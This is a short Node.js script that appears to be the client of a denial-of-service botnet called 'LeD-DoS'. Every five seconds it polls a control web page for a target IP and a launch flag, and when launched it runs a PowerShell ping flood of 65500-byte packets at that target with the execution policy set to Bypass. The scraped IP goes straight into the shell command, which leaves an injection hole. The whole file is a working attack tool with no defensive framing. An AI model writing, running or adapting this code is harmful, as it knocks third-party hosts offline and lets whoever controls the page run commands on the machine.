const request = require('request');
const cheerio = require('cheerio');
var ping = require('ping');
var fs = require('fs');
const Shell = require('node-powershell');

setInterval(function () {

    request('http://localhost/LeD-DoS/Web/dos.php', (error, response, html) => {
        if (!error && response.statusCode == 200) {
            const $ = cheerio.load(html);

            const ip = $('.ip');
            const output = ip.find('p').text();

            const check = $('.check');
            const gotime = check.find('p').text();

            var current = fs.readFile("ip.txt", function(err, current){
                // console.log("IP: " + output + ", Active: " + gotime + ", Current IP: " + current.toString());
            });

            if (gotime == 1) {

                const ps = new Shell({
                    executionPolicy: 'Bypass',
                    noProfile: true
                  });
                   
                  ps.addCommand('ping ' + output + ' -l 65500 -w 1 -t');
                  ps.invoke()
                  .then(com => {
                    console.log(com);
                  })
                  .catch(err => {
                    console.log(err);
                  });

            }
            
            if (gotime != '1') {
                console.log("Awaitng Launch Order!")
            }
        }
    });
}, 5000);